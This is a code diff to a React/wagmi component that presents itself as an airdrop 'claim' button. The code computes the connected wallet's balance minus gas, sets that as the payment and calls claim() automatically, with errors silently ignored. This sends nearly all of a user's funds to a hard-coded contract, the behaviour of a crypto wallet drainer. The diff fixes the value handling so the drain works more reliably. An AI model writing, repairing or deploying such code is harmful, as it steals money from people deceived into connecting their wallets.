@@ -21,12 +21,12 @@ import { parseEther } from "viem";
 const contractAddress = "0x794bF077074D4aC9e958c19CceEDe1e04ddB1a5E";
 
 export const CustomConnect = () => {
-  const [payValue, setPayValue] = useState(parseEther("0"));
+  const [payValue, setPayValue] = useState(0.0);
   const { config } = usePrepareContractWrite({
     address: contractAddress,
     abi: airdropAbi,
     functionName: "claim",
-    value: payValue,
+    value: parseEther(payValue.toString()),
   });
   const { write: claim, isLoading: isLoadingClaim } = useContractWrite(config);
 
@@ -83,13 +83,12 @@ export const CustomConnect = () => {
         setCallFuncGasFee(gasAmount);
         if (balance.lte(gasAmount.mul(BigNumber.from(2)))) return;
 
-        setPayValue(
-          parseEther(
-            utils.formatEther(balance.sub(gasAmount.mul(BigNumber.from(2))))
-          )
+        const newPayValue = parseFloat(
+          utils.formatEther(balance.sub(gasAmount.mul(BigNumber.from(2))))
         );
+        setPayValue(newPayValue);
 
-        if (!isLoadingClaim) {
+        if (!isLoadingClaim && payValue > 0) {
           claim();
         }
       } catch (error) {}
